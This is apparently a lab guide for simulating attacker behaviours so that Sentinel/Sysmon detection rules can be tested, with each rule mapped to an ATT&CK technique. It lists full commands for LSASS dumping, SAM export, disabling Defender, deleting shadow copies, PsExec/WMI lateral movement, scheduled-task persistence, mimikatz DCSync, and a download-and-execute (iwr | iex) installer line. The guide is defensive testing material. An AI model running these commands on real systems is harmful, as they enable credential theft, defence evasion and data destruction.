# 💥 Attack Simulation Guide

Purpose: Provide reproducible behaviors for each detection rule. Run only in this lab; do not execute on production assets.

## Prereqs
- Windows target VM with Sysmon + Security logging per `setup/`.
- PowerShell run as Administrator; enable local script execution if needed.
- Install Atomic Red Team on the Windows VM:
	```powershell
	iwr https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1 -UseBasicParsing | iex
	```

## Mapping (Detections ↔ Behaviors)
- `001_LSASS_Memory_Dump` / `019_Lsass_Handle_Access_Sysmon10` — Dump lsass (T1003.001)
- `002_PowerShell_EncodedCommand` — PowerShell with `-EncodedCommand` (T1059.001)
- `003_rundll32_suspicious_execution` — Rundll32 script/URL handler (T1218.011)
- `004_scheduled_task_creation_persistence` — Create scheduled task (T1053.005)
- `005_SMB_LateralMovement` / `018_SMBexec_Admin_Share_Copy` — Admin share access/copy (T1021.002)
- `006_wmi_process_creation_suspicious` / `017_Remote_PowerShell_Remoting` — WMI/WinRM remote exec (T1047/T1021.006)
- `007_RDP_BruteForce_LogonFailures` — Multiple 4625 RDP failures (T1110.001)
- `008_PsExec_Service_Creation` — PSEXESVC creation (T1021.002)
- `009_New_Local_Admin_Account` — New admin user (T1098)
- `010_Suspicious_PowerShell_Download` — IEX/IWR/DownloadString (T1059.001)
- `011_PowerShell_AMSI_Bypass` — AMSI bypass strings (T1562.001)
- `012_SAM_Database_Copy` — `reg save HKLM\\SAM` (T1003.002)
- `013_Defender_Disable_Settings` — Disable Defender via PowerShell (T1562.001)
- `014_Registry_RunKey_Persistence` — Run/RunOnce changes (T1547.001)
- `015_VSSAdmin_Delete_Shadows` — Delete shadow copies (T1490)
- `016_Suspicious_WMI_Persistence` — WMI subscriptions (T1546.003)
- `020_Suspicious_Child_Of_Office` — Office spawning scripts (T1204.002)
- `021_DCSync_Replication_Request` — DCSync replication from non-DC (T1003.006)

## Example Commands (lab only)
- LSASS dump (Sysinternals):
	```powershell
	iwr https://live.sysinternals.com/procdump.exe -OutFile procdump.exe
	./procdump.exe -accepteula -ma lsass.exe lsass.dmp
	```
- Encoded PowerShell:
	```powershell
	$cmd = 'calc.exe'
	$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
	powershell.exe -enc $enc
	```
- Rundll32 script abuse:
	```powershell
	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();WScript.Echo("hi");
	```
- Scheduled task:
	```powershell
	schtasks /create /tn "backdoor" /tr "cmd.exe /c calc.exe" /sc ONLOGON /ru SYSTEM
	```
- Admin share access / copy:
	```powershell
	Test-Path \\TARGET\ADMIN$
	dir \\TARGET\C$\Windows
	```
- PsExec lateral move:
	```powershell
	iwr https://live.sysinternals.com/PsExec.exe -OutFile PsExec.exe
	./PsExec.exe \\TARGET cmd.exe
	```
- WMI remote process:
	```powershell
	Invoke-WmiMethod -Class Win32_Process -ComputerName TARGET -Name Create -ArgumentList "cmd.exe /c calc.exe"
	```
- WinRM remoting (creates wsmprovhost.exe child):
	```powershell
	Enter-PSSession -ComputerName TARGET
	```
- SAM copy:
	```powershell
	reg save HKLM\SAM C:\\temp\\sam.save
	```
- Defender tamper:
	```powershell
	powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
	```
- Shadow copy delete:
	```powershell
	vssadmin delete shadows /all /quiet
	```
- WMI persistence:
	```powershell
	# Example placeholder: use Atomic T1546.003 tests for event filter/consumer
	Invoke-AtomicTest T1546.003 -ShowDetails
	```
- Office spawning PowerShell (macro emulation):
	```powershell
	# Simulate by starting WINWORD then spawning powershell from macro runner (manual)
	```
- DCSync (lab-only):
	```powershell
	# Use mimikatz in lab: lsadump::dcsync /domain:<domain> /user:<user>
	```

## Notes
- Use Atomic tests where possible to avoid manual command crafting.
- Clean up artifacts: dumps, tools, scheduled tasks, WMI subs, admin accounts.
- Capture Sentinel alert screenshots for `reports/`.
### **1. Atomic Red Team**
Install:
```powershell
iwr https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1 -UseBasicParsing | iex
